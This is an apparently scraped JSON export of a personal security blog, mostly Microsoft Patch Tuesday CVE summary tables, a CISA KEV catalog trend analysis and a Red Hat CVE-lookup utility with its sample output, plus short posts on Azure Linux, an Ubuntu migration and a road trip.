B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-49001 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-49002 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-49003 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-49004 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-49005 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-49007 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-49006 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-49008 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-49009 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-49010 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-49011 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-49012 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-49013 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-49014 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-49015 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-49016 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-49017 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-49018 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-49039 │ B:8.8/T:8.2 [K] │ Windows Task Scheduler Elevation of Privilege Vulnerability │ │ CVE-2024-49050 │ B:8.8/T:7.7 │ Visual Studio Code Python Extension Remote Code Execution Vulnerability │ │ CVE-2024-49060 │ B:8.8/T:7.7 │ Azure Stack HCI Elevation of Privilege Vulnerability │ │ CVE-2024-43639 │ B:9.8/T:8.5 │ Windows KDC Proxy Remote Code Execution Vulnerability │ └────────────────┴─────────────────┴──────────────────────────────────────────────────────────────────────────┘ High_Likelihood/9 ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ CVE ┃ CVSS_Base/Temp ┃ Title_Value ┃ ┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩ │ CVE-2024-43623 │ B:7.8/T:6.8 │ Windows NT OS Kernel Elevation of Privilege Vulnerability │ │ CVE-2024-43630 │ B:7.8/T:6.8 │ Windows Kernel Elevation of Privilege Vulnerability │ │ CVE-2024-49040 │ B:7.5/T:6.7 │ Microsoft Exchange Server Spoofing Vulnerability │ │ CVE-2024-43629 │ B:7.8/T:6.8 │ Windows DWM Core Library Elevation of Privilege Vulnerability │ │ CVE-2024-43636 │ B:7.8/T:6.8 │ Win32k Elevation of Privilege Vulnerability │ │ CVE-2024-43642 │ B:7.5/T:6.5 │ Windows SMB Denial of Service Vulnerability │ │ CVE-2024-49019 │ B:7.8/T:6.8 │ Active Directory Certificate Services Elevation of Privilege Vulnerability │ │ CVE-2024-49033 │ B:7.5/T:6.5 │ Microsoft Word Security Feature Bypass Vulnerability │ │ CVE-2024-49060 │ B:8.8/T:7.7 │ Azure Stack HCI Elevation of Privilege Vulnerability │ └────────────────┴────────────────┴────────────────────────────────────────────────────────────────────────────┘ Exploited_in_Wild/2 ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ CVE ┃ CVSS_Base/Temp ┃ Title_Value ┃ ┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩ │ CVE-2024-43451 │ B:6.5/T:6.0 [K] │ NTLM Hash Disclosure Spoofing Vulnerability │ │ CVE-2024-49039 │ B:8.8/T:8.2 [K] │ Windows Task Scheduler Elevation of Privilege Vulnerability │ └────────────────┴─────────────────┴─────────────────────────────────────────────────────────────┘ [+] Product Families (12) Windows ▇▇▇▇▇▇▇▇▇▇▇▇ 27 Azure ▇▇▇▇▇▇▇▇▇▇▇ 25 Microsoft Office ▇▇▇▇▇▇▇▇▇ 22 ESU ▇▇▇▇ 10 Developer Tools ▇▇▇▇ 9 SQL Server ▇▇▇ 8 Mariner ▇▇▇ 6 Server Software ▇ 3 System Center ▇ 2 Open Source Software ▇ 2 Browser ▏ 1 Apps ▏ 1 [*] \u0026#34;November 2024 Security Updates\u0026#34; (Rev 164) [-] Initial Release date: 2024-11-12T08:00:00 [-] Current Release date: 2024-11-18T08:00:00 [*] [2024-11-19] main(): Completed within [9.6138 sec]. Outro # Tool: Patch_Tuesday at GitHub. Tool: CISA KEV Catalog at GitHub. ","date":"2024-11-15 17:36","externalUrl":null,"permalink":"/posts/2024_nov/","section":"posts","summary":"$ ./patch_tuesday.py -k 2024-nov -vc","title":"Patch Tuesday (2024-11)","type":"posts"},{"content":"","date":"2024-11-14 20:24","externalUrl":null,"permalink":"/categories/metime/","section":"categories","summary":"","title":"MeTime","type":"categories"},{"content":" This is my first me time in 2024 with my Suzuki Jimny, from Nov 6 till Nov 11. ","date":"2024-11-14 20:24","externalUrl":null,"permalink":"/posts/trip202411/","section":"posts","summary":"First \u003ccode\u003eme time\u003c/code\u003e in 2024.","title":"My Me-Time Trip","type":"posts"},{"content":"","date":"2024-11-14 20:24","externalUrl":null,"permalink":"/tags/trip/","section":"tags","summary":"","title":"trip","type":"tags"},{"content":" After 3 years since CISA released the first batch of KEV, here are what we know:\nThe peak periods for CISA to release KEV are concentrated in five specific months. The top-5 vendors and the top-5 vulnerable products remain consistently. Within the KEV catalog, the top-5 vendors hold 48.83% and the top-5 vulnerable products hold 21.7% from 1202 CVEs. I want to take a moment to thank you for your support of the \u0026ldquo;CISA_KEV\u0026rdquo; series. After careful consideration, I have decided to stop updating this series. This decision allows me to focus on other projects and initiatives that I believe will better serve our community and my interests.\nKey Takeaways # The \u0026ldquo;CISA_KEV\u0026rdquo; series has been around for 12 months. And we learn some patterns from the analysis, and see some consistencies here.\nThose consistencies can provide several advantages for future security planning and vulnerability management:\nProactive Risk Mitigation: Knowing that certain vendors and products are consistently vulnerable allows us to prioritize patching, monitoring, and hardening efforts for those systems.\nFocused Security Investments: Resources can be allocated more effectively by focusing on the vendors and products that consistently show up in KEV catalog, leading to better defense mechanisms and preparedness.\nPredictive Analysis: Over time, these consistencies may help predict potential vulnerabilities, allowing teams to act preemptively, reducing the window of exposure for new or emerging threats.\nVendor Accountability: Persistent patterns in KEV catalog can be used to push vendors for quicker security fixes or to encourage adoption of more secure development practices.\nStreamlined Incident Response: Recognizing patterns in vulnerable products simplifies incident response planning, as security teams can develop standardized procedures to handle recurring risks.\nIn essence, these consistencies enable more strategic, data-driven decisions in cybersecurity management, potentially improving defenses against future threats.\nAlthough the top 5 vendors and products are consistently affected, the specific vulnerabilities may still vary, suggesting that while patterns exist, the nature of vulnerabilities is not necessarily consistent.\nUpdates # CISA KEV has been released 36 months. Today, there are total of 1202 (+43) CVE been added to CISA KEV catalog.\nCISA Catalog of Known Exploited Vulnerabilities [ 2024.10.24/1202 ]\nAs of today, there are total of 1193 CVE have overdue, with another 9 more upcoming.\nHighlights (within CISA KEV catalog):\nThe top-5 vendors and top-5 vulnerable products remain the same. From all the vendors (187), the top-5 vendors hold 587 (around 48.83%) of all the 1202 CVEs. From all the vulnerable products (492), the top-5 vulnerable products hold 261 (or ~21.7%) of all the 1202 CVEs. The top-5 months where distribution of KEV is higher than mean remain the same (Mar, Apr, May Jun, Nov). Current State # Microsoft Apple Cisco Adobe Google others 307 75 73 72 60 615 Windows Multiple Products (Apple) Flash Player Chromium V8 Internet Explorer others 126 38 33 32 32 941 mean_val=100.16666666666667\nJan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec 28 32 132 164 241 160 70 59 69 73 134 40 ","date":"2024-11-01 17:58","externalUrl":null,"permalink":"/posts/cisa_kev_36m/","section":"posts","summary":"Analysis updates of CISA KEV catalog after 36 months.","title":"3rd Anniversary with CISA KEV","type":"posts"},{"content":"","date":"2024-11-01 17:58","externalUrl":null,"permalink":"/tags/cisa/","section":"tags","summary":"","title":"cisa","type":"tags"},{"content":"","date":"2024-11-01 17:58","externalUrl":null,"permalink":"/series/cisa_kev/","section":"series","summary":"","title":"CISA_KEV","type":"series"},{"content":"","date":"2024-11-01 17:58","externalUrl":null,"permalink":"/tags/kev/","section":"tags","summary":"","title":"kev","type":"tags"},{"content":"","date":"2024-11-01 17:58","externalUrl":null,"permalink":"/series/","section":"series","summary":"","title":"series","type":"series"},{"content":"","date":"2024-11-01 17:58","externalUrl":null,"permalink":"/tags/vulnmgmt/","section":"tags","summary":"","title":"vulnmgmt","type":"tags"},{"content":"","date":"2024-10-31 16:16","externalUrl":null,"permalink":"/tags/azure/","section":"tags","summary":"","title":"azure","type":"tags"},{"content":" Azure Linux is available as an ISO file that makes it easy to install at cloud, in a VM, or in home lab. Microsoft Azure Linux 3.0 has been released recently.\nAzure Linux was called CBL-Mariner (version 1.0 and 2.0).\nIt is a Linux distribution for Microsoft\u0026rsquo;s cloud infra and edge. It is designed, as CLI-mode only, to provide a consistent platform to allow Microsoft to stay current on Linux updates.\nAzure Linux has been engineered with a small common set of packages to address the universal needs of first party cloud and edge services. However, any individual can layer additional packages on top of the common core packages and produce images for their workloads.\nAzure Linux is designed to consumes limited disk and memory resources.\nWith its lighweight characteristics, Azure Linux provides faster boot times and a minimal attack surface. And this makes it aimed to be deployed as a container or a container host.\nThis could be a great choice of Linux distribution for enterprise who intend to create custom Linux distribution.\nLinks # GitHub: Azure Linux Direct download Azure Linux 3.0 x86_64 ISO. Quickstart instructions ","date":"2024-10-31 16:16","externalUrl":null,"permalink":"/posts/azure_linux/","section":"posts","summary":"An internal Linux distribution for Microsoft\u0026rsquo;s cloud infrastructure and edge products/services.","title":"Azure Linux","type":"posts"},{"content":"","date":"2024-10-31 16:16","externalUrl":null,"permalink":"/tags/linux/","section":"tags","summary":"","title":"linux","type":"tags"},{"content":" Moving to Ubuntu platform. $ lsb_release -a No LSB modules are available. Distributor ID: Ubuntu Description: Ubuntu 24.04.1 LTS Release: 24.04 Codename: noble ","date":"2024-10-26 10:11","externalUrl":null,"permalink":"/posts/migration_2024/","section":"posts","summary":"Quick migration from WSL to Ubuntu.","title":"Migration in 2024","type":"posts"},{"content":"","date":"2024-10-26 10:11","externalUrl":null,"permalink":"/tags/ubuntu/","section":"tags","summary":"","title":"ubuntu","type":"tags"},{"content":" A handy utility to check CVE details via Red Hat Access API. Vulnerability management is an essential IT security practice that involves identifying, assessing, and remediating security flaws in devices, networks, and applications, in order to reduce the risks of cyberattacks and security breaches.\nOne of the time-consuming task to support vulnerability management is post-scan validation.\nThese includes false-postive verification, patch availability checking, and most important is \u0026ldquo;Does the CVE applicable to me?\u0026rdquo;.\nRedHat Access # Luckily, RedHat has provide an excellent API access and CSAF/VEX framework to provide latest information.\nCSAF is a replacement for the Common Vulnerability Reporting Framework (CVRF). VEX is a profile in the CSAF standard.\nIn short, RedHat Product Security Center has provided an easy way to check CVE details for post-scan validation tasks.\nUtil: rha_cve_check # The util is available at 2 formats: Python script rha_cve_check.py and Windows executable (exe) rha_cve_check.zip. Both can be downloaded at the GitHub repo below.\nmyseq/utils some ultilities Python 0 0 Below is how it works.\n$ ./rha_cve_check.py usage: rha_cve_check.py [-h] [-v] \u0026lt;cve\u0026gt; [\u0026lt;cve\u0026gt; ...] Zzzzz |\\ _,,,---,,_ /,`.-\u0026#39;`\u0026#39; -. ;-;;,_ __author__ : [ zd ] |,4- ) )-,_..;\\ ( `\u0026#39;-\u0026#39; __year__ : [ 2024.09 ] \u0026#39;---\u0026#39;\u0026#39;(_/--\u0026#39; `-\u0026#39;\\_) Retrieve CVE details directly via RedHat Security Data API. [ base_url = \u0026#39;https://access.redhat.com/hydra/rest/securitydata\u0026#39; ] positional arguments: \u0026lt;cve\u0026gt; Specify a CVE or a list of CVEs. options: -h, --help show this help message and exit -v verbose output RedHat Security Data API: See https://docs.redhat.com/en/documentation/red_hat_security_data_api/1.0/html-single/red_hat_security_data_api/index Below is sample outputs to check on CUPS\u0026rsquo;s cve. Note that it can accept different format of the CVEs.\nc:\\\u0026gt; rha_cve_check CVE-2024-47076 cve-2024-47175 2024-47176 2024-47177 -v [*] Searching 4/4 CVEs... [+] [200] https://access.redhat.com/hydra/rest/securitydata/cve/CVE-2024-47177.json [+] [200] https://access.redhat.com/hydra/rest/securitydata/cve/CVE-2024-47176.json [+] [200] https://access.redhat.com/hydra/rest/securitydata/cve/CVE-2024-47076.json [+] [200] https://access.redhat.com/hydra/rest/securitydata/cve/CVE-2024-47175.json [*] All [4 responses] are OK. [*] Successful fetched : 4/4 [+] CVE-2024-47175 | cvss3:7.7 (released at 2024-09-26) [-] CVE-2024-47175 : cpe:/o:redhat:rhel_aus:7.7 [ Red Hat Enterprise Linux 7.7 Advanced Update Support ] Packages=cups-filters-0:1.0.35-26.el7_7.3 | RHSA-2024:7551 (2024-10-02) [-] CVE-2024-47175 : cpe:/o:redhat:rhel_els:7 [ Red Hat Enterprise Linux 7 Extended Lifecycle Support ] Packages=cups-filters-0:1.0.35-29.el7_9.3 | RHSA-2024:7553 (2024-10-02) [-] CVE-2024-47175 : cpe:/a:redhat:enterprise_linux:8 [ Red Hat Enterprise Linux 8 ] Packages=cups-filters-0:1.20.0-35.el8_10 | RHSA-2024:7463 (2024-10-01) [-] CVE-2024-47175 : cpe:/a:redhat:rhel_aus:8.2 [ Red Hat Enterprise Linux 8.2 Advanced Update Support ] Packages=cups-filters-0:1.20.0-19.el8_2.2 | RHSA-2024:7461 (2024-10-01) [-] CVE-2024-47175 : cpe:/a:redhat:rhel_aus:8.4 [ Red Hat Enterprise Linux 8.4 Advanced Mission Critical Update Support ] Packages=cups-filters-0:1.20.0-24.el8_4.2 | RHSA-2024:7504 (2024-10-02) [-] CVE-2024-47175 : cpe:/a:redhat:rhel_tus:8.4 [ Red Hat Enterprise Linux 8.4 Telecommunications Update Service ] Packages=cups-filters-0:1.20.0-24.el8_4.2 | RHSA-2024:7504 (2024-10-02) [-] CVE-2024-47175 : cpe:/a:redhat:rhel_e4s:8.4 [ Red Hat Enterprise Linux 8.4 Update Services for SAP Solutions ] Packages=cups-filters-0:1.20.0-24.el8_4.2 | RHSA-2024:7504 (2024-10-02) [-] CVE-2024-47175 : cpe:/a:redhat:rhel_aus:8.6 [ Red Hat Enterprise Linux 8.6 Advanced Mission Critical Update Support ] Packages=cups-filters-0:1.20.0-27.el8_6.3 | RHSA-2024:7623 (2024-10-03) [-] CVE-2024-47175 : cpe:/a:redhat:rhel_tus:8.6 [ Red Hat Enterprise Linux 8.6 Telecommunications Update Service ] Packages=cups-filters-0:1.20.0-27.el8_6.3 | RHSA-2024:7623 (2024-10-03) [-] CVE-2024-47175 : cpe:/a:redhat:rhel_e4s:8.6 [ Red Hat Enterprise Linux 8.6 Update Services for SAP Solutions ] Packages=cups-filters-0:1.20.0-27.el8_6.3 | RHSA-2024:7623 (2024-10-03) [-] CVE-2024-47175 : cpe:/a:redhat:rhel_eus:8.8 [ Red Hat Enterprise Linux 8.8 Extended Update Support ] Packages=cups-filters-0:1.20.0-29.el8_8.3 | RHSA-2024:7462 (2024-10-01) [-] CVE-2024-47175 : cpe:/a:redhat:enterprise_linux:9 [ Red Hat Enterprise Linux 9 ] Packages=cups-filters-0:1.28.7-17.el9_4 | RHSA-2024:7346 (2024-09-27) [-] CVE-2024-47175 : cpe:/a:redhat:rhel_e4s:9.0 [ Red Hat Enterprise Linux 9.0 Update Services for SAP Solutions ] Packages=cups-filters-0:1.28.7-10.el9_0.2 | RHSA-2024:7506 (2024-10-02) [-] CVE-2024-47175 : cpe:/a:redhat:rhel_eus:9.2 [ Red Hat Enterprise Linux 9.2 Extended Update Support ] Packages=cups-filters-0:1.28.7-11.el9_2.2 | RHSA-2024:7503 (2024-10-02) [-] Mitigation : See the security bulletin for a detailed mitigation procedure. [-] CVE-2024-47175 : cpe:/o:redhat:enterprise_linux:7 [Red Hat Enterprise Linux 7] cups (Fix deferred) [-] CVE-2024-47175 : cpe:/o:redhat:enterprise_linux:8 [Red Hat Enterprise Linux 8] cups (Fix deferred) [-] CVE-2024-47175 : cpe:/o:redhat:enterprise_linux:9 [Red Hat Enterprise Linux 9] cups (Fix deferred) [-] CVE-2024-47175 : cpe:/a:redhat:openshift:4 [Red Hat OpenShift Container Platform 4] rhcos (Not affected) [+] CVE-2024-47177 | cvss3:6.1 (released at 2024-09-26) [-] OS/package : Current investigation indicates that no versions of Red Hat Enterprise Linux (RHEL) are affected. [-] Mitigation : See the security bulletin for a detailed mitigation procedure. [-] CVE-2024-47177 : cpe:/o:redhat:enterprise_linux:7 [Red Hat Enterprise Linux 7] cups-filters (Not affected) [-] CVE-2024-47177 : cpe:/o:redhat:enterprise_linux:7 [Red Hat Enterprise Linux 7] foomatic (Will not fix) [-] CVE-2024-47177 : cpe:/o:redhat:enterprise_linux:8 [Red Hat Enterprise Linux 8] cups-filters (Affected) [-] CVE-2024-47177 : cpe:/o:redhat:enterprise_linux:8 [Red Hat Enterprise Linux 8] foomatic (Not affected) [-] CVE-2024-47177 : cpe:/o:redhat:enterprise_linux:9 [Red Hat Enterprise Linux 9] cups-filters (Affected) [-] CVE-2024-47177 : cpe:/o:redhat:enterprise_linux:9 [Red Hat Enterprise Linux 9] foomatic (Not affected) [+] CVE-2024-47176 | cvss3:7.5 (released at 2024-09-26) [-] CVE-2024-47176 : cpe:/o:redhat:rhel_aus:7.7 [ Red Hat Enterprise Linux 7.7 Advanced Update Support ] Packages=cups-filters-0:1.0.35-26.el7_7.3 | RHSA-2024:7551 (2024-10-02) [-] CVE-2024-47176 : cpe:/o:redhat:rhel_els:7 [ Red Hat Enterprise Linux 7 Extended Lifecycle Support ] Packages=cups-filters-0:1.0.35-29.el7_9.3 | RHSA-2024:7553 (2024-10-02) [-] CVE-2024-47176 : cpe:/a:redhat:enterprise_linux:8 [ Red Hat Enterprise Linux 8 ] Packages=cups-filters-0:1.20.0-35.el8_10 | RHSA-2024:7463 (2024-10-01) [-] CVE-2024-47176 : cpe:/a:redhat:rhel_aus:8.2 [ Red Hat Enterprise Linux 8.2 Advanced Update Support ] Packages=cups-filters-0:1.20.0-19.el8_2.2 | RHSA-2024:7461 (2024-10-01) [-] CVE-2024-47176 : cpe:/a:redhat:rhel_aus:8.4 [ Red Hat Enterprise Linux 8.4 Advanced Mission Critical Update Support ] Packages=cups-filters-0:1.20.0-24.el8_4.2 | RHSA-2024:7504 (2024-10-02) [-] CVE-2024-47176 : cpe:/a:redhat:rhel_tus:8.4 [ Red Hat Enterprise Linux 8.4 Telecommunications Update Service ] Packages=cups-filters-0:1.20.0-24.el8_4.2 | RHSA-2024:7504 (2024-10-02) [-] CVE-2024-47176 : cpe:/a:redhat:rhel_e4s:8.4 [ Red Hat Enterprise Linux 8.4 Update Services for SAP Solutions ] Packages=cups-filters-0:1.20.0-24.el8_4.2 | RHSA-2024:7504 (2024-10-02) [-] CVE-2024-47176 : cpe:/a:redhat:rhel_aus:8.6 [ Red Hat Enterprise Linux 8.6 Advanced Mission Critical Update Support ] Packages=cups-filters-0:1.20.0-27.el8_6.3 | RHSA-2024:7623 (2024-10-03) [-] CVE-2024-47176 : cpe:/a:redhat:rhel_tus:8.6 [ Red Hat Enterprise Linux 8.6 Telecommunications Update Service ] Packages=cups-filters-0:1.20.0-27.el8_6.3 | RHSA-2024:7623 (2024-10-03) [-] CVE-2024-47176 : cpe:/a:redhat:rhel_e4s:8.6 [ Red Hat Enterprise Linux 8.6 Update Services for SAP Solutions ] Packages=cups-filters-0:1.20.0-27.el8_6.3 | RHSA-2024:7623 (2024-10-03) [-] CVE-2024-47176 : cpe:/a:redhat:rhel_eus:8.8 [ Red Hat Enterprise Linux 8.8 Extended Update Support ] Packages=cups-filters-0:1.20.0-29.el8_8.3 | RHSA-2024:7462 (2024-10-01) [-] CVE-2024-47176 : cpe:/a:redhat:enterprise_linux:9 [ Red Hat Enterprise Linux 9 ] Packages=cups-filters-0:1.28.7-17.el9_4 | RHSA-2024:7346 (2024-09-27) [-] CVE-2024-47176 : cpe:/a:redhat:rhel_e4s:9.0 [ Red Hat Enterprise Linux 9.0 Update Services for SAP Solutions ] Packages=cups-filters-0:1.28.7-10.el9_0.2 | RHSA-2024:7506 (2024-10-02) [-] CVE-2024-47176 : cpe:/a:redhat:rhel_eus:9.2 [ Red Hat Enterprise Linux 9.2 Extended Update Support ] Packages=cups-filters-0:1.28.7-11.el9_2.2 | RHSA-2024:7503 (2024-10-02) [-] Mitigation : See the security bulletin for a detailed mitigation procedure. [+] CVE-2024-47076 | cvss3:8.2 (released at 2024-09-26) [-] CVE-2024-47076 : cpe:/o:redhat:rhel_aus:7.7 [ Red Hat Enterprise Linux 7.7 Advanced Update Support ] Packages=cups-filters-0:1.0.35-26.el7_7.3 | RHSA-2024:7551 (2024-10-02) [-] CVE-2024-47076 : cpe:/o:redhat:rhel_els:7 [ Red Hat Enterprise Linux 7 Extended Lifecycle Support ] Packages=cups-filters-0:1.0.35-29.el7_9.3 | RHSA-2024:7553 (2024-10-02) [-] CVE-2024-47076 : cpe:/a:redhat:enterprise_linux:8 [ Red Hat Enterprise Linux 8 ] Packages=cups-filters-0:1.20.0-35.el8_10 | RHSA-2024:7463 (2024-10-01) [-] CVE-2024-47076 : cpe:/a:redhat:rhel_aus:8.2 [ Red Hat Enterprise Linux 8.2 Advanced Update Support ] Packages=cups-filters-0:1.20.0-19.el8_2.2 | RHSA-2024:7461 (2024-10-01) [-] CVE-2024-47076 : cpe:/a:redhat:rhel_aus:8.4 [ Red Hat Enterprise Linux 8.4 Advanced Mission Critical Update Support ] Packages=cups-filters-0:1.20.0-24.el8_4.2 | RHSA-2024:7504 (2024-10-02) [-] CVE-2024-47076 : cpe:/a:redhat:rhel_tus:8.4 [ Red Hat Enterprise Linux 8.4 Telecommunications Update Service ] Packages=cups-filters-0:1.20.0-24.el8_4.2 | RHSA-2024:7504 (2024-10-02) [-] CVE-2024-47076 : cpe:/a:redhat:rhel_e4s:8.4 [ Red Hat Enterprise Linux 8.4 Update Services for SAP Solutions ] Packages=cups-filters-0:1.20.0-24.el8_4.2 | RHSA-2024:7504 (2024-10-02) [-] CVE-2024-47076 : cpe:/a:redhat:rhel_aus:8.6 [ Red Hat Enterprise Linux 8.6 Advanced Mission Critical Update Support ] Packages=cups-filters-0:1.20.0-27.el8_6.3 | RHSA-2024:7623 (2024-10-03) [-] CVE-2024-47076 : cpe:/a:redhat:rhel_tus:8.6 [ Red Hat Enterprise Linux 8.6 Telecommunications Update Service ] Packages=cups-filters-0:1.20.0-27.el8_6.3 | RHSA-2024:7623 (2024-10-03) [-] CVE-2024-47076 : cpe:/a:redhat:rhel_e4s:8.6 [ Red Hat Enterprise Linux 8.6 Update Services for SAP Solutions ] Packages=cups-filters-0:1.20.0-27.el8_6.3 | RHSA-2024:7623 (2024-10-03) [-] CVE-2024-47076 : cpe:/a:redhat:rhel_eus:8.8 [ Red Hat Enterprise Linux 8.8 Extended Update Support ] Packages=cups-filters-0:1.20.0-29.el8_8.3 | RHSA-2024:7462 (2024-10-01) [-] CVE-2024-47076 : cpe:/a:redhat:enterprise_linux:9 [ Red Hat Enterprise Linux 9 ] Packages=cups-filters-0:1.28.7-17.el9_4 | RHSA-2024:7346 (2024-09-27) [-] CVE-2024-47076 : cpe:/a:redhat:rhel_e4s:9.0 [ Red Hat Enterprise Linux 9.0 Update Services for SAP Solutions ] Packages=cups-filters-0:1.28.7-10.el9_0.2 | RHSA-2024:7506 (2024-10-02) [-] CVE-2024-47076 : cpe:/a:redhat:rhel_eus:9.2 [ Red Hat Enterprise Linux 9.2 Extended Update Support ] Packages=cups-filters-0:1.28.7-11.el9_2.2 | RHSA-2024:7503 (2024-10-02) [-] Mitigation : See the security bulletin for a detailed mitigation procedure. [*] main(): completed within [0.8496 sec]. Links # What is vulnerability management? Common Security Advisory Framework (CSAF) What is VEX? ","date":"2024-10-10 11:55","externalUrl":null,"permalink":"/posts/rhaccess/","section":"posts","summary":"Searching CVE details with RedHat Access for vulnerability management.","title":"Checking CVE with RedHat Access","type":"posts"},{"content":"","date":"2024-10-10 11:55","externalUrl":null,"permalink":"/tags/redhat/","section":"tags","summary":"","title":"redhat","type":"tags"},{"content":" Summarizing from https://msrc.microsoft.com/update-guide/releaseNote/2024-Oct. Key Takeways # 177 newly disclosed vulnerabilities and 4 non-Microsoft CVEs released in Oct 2024. Highest CVSS Based Score is 9.8 (CVE-2024-43468). Other 2 critical vulnerabilities include CVE-2024-43488 and CVE-2024-43582. 4 zero-day flaws with 2 are actively exploited. CVE-2024-43572 [CISA_KEV] CVE-2024-43573 [CISA_KEV] CVE-2024-20659 CVE-2024-43583 Total of 2 CVEs found in CISA_KEV and exploited in wild. Total of 120 CVEs that require customer action. (New metric starting in Aug 2024) 43 remote code execution vulnerabilities (RCE). Video is added later since it only been released on Oct 10.\nPatch_Tuesday # $ patch_tuesday -k 2024-oct -vc _____ _ _ _____ _ | _ |___| |_ ___| |_ |_ _|_ _ ___ ___ _| |___ _ _ | __| .\u0026#39;| _| _| | | | | | | -_|_ -| . | .\u0026#39;| | | |__| |__,|_| |___|_|_| |_| |___|___|___|___|__,|_ | |___| [*] Finish fetching [2,146,701 bytes] from https://api.msrc.microsoft.com/cvrf/v3.0/cvrf/2024-oct [*] CISA Catalog of Known Exploited Vulnerabilities [ 2024.10.08/1190 ] Microsoft Patch Tuesday - By MSRC =============================================== \u0026lt;\u0026lt; October 2024 Security Updates [ 2024-10-08 ] \u0026gt;\u0026gt; [+] Vulnerabilities : [ 122 ] [-] High_Severity : [ 23 ] [-] High_likelihood : [ 9 ] [-] Exploited in_wild : [ 2 ] [-] Action_required : [ 120 ] [-] Found in CISA_KEV : [ 2 ] High_Severity/23 ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ CVE ┃ CVSS_Base/Temp ┃ Title_Value ┃ ┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩ │ CVE-2024-38179 │ B:8.8/T:7.7 │ Azure Stack Hyperconverged Infrastructure (HCI) Elevation of Privilege Vulnerability │ │ CVE-2024-43518 │ B:8.8/T:7.7 │ Windows Telephony Server Remote Code Execution Vulnerability │ │ CVE-2024-43519 │ B:8.8/T:7.7 │ Microsoft WDAC OLE DB provider for SQL Server Remote Code Execution Vulnerability │ │ CVE-2024-43532 │ B:8.8/T:7.7 │ Remote Registry Service Elevation of Privilege Vulnerability │ │ CVE-2024-43533 │ B:8.8/T:7.7 │ Remote Desktop Client Remote Code Execution Vulnerability │ │ CVE-2024-6197 │ B:8.8/T:7.7 │ Open Source Curl Remote Code Execution Vulnerability │ │ CVE-2024-43608 │ B:8.8/T:7.7 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution Vulnerability │ │ CVE-2024-43607 │ B:8.8/T:7.7 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution Vulnerability │ │ CVE-2024-38124 │ B:9.0/T:7.8 │ Windows Netlogon Elevation of Privilege Vulnerability │ │ CVE-2024-38265 │ B:8.8/T:7.7 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution Vulnerability │ │ CVE-2024-43453 │ B:8.8/T:7.7 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution Vulnerability │ │ CVE-2024-38212 │ B:8.8/T:7.7 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution Vulnerability │ │ CVE-2024-43468 │ B:9.8/T:8.5 │ Microsoft Configuration Manager Remote Code Execution Vulnerability │ │ CVE-2024-43517 │ B:8.8/T:7.7 │ Microsoft ActiveX Data Objects Remote Code Execution Vulnerability │ │ CVE-2024-43549 │ B:8.8/T:7.7 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution Vulnerability │ │ CVE-2024-43564 │ B:8.8/T:7.7 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution Vulnerability │ │ CVE-2024-43589 │ B:8.8/T:8.1 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution Vulnerability │ │ CVE-2024-43591 │ B:8.7/T:7.6 │ Azure Command Line Integration (CLI) Elevation of Privilege Vulnerability │ │ CVE-2024-43592 │ B:8.8/T:7.7 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution Vulnerability │ │ CVE-2024-43593 │ 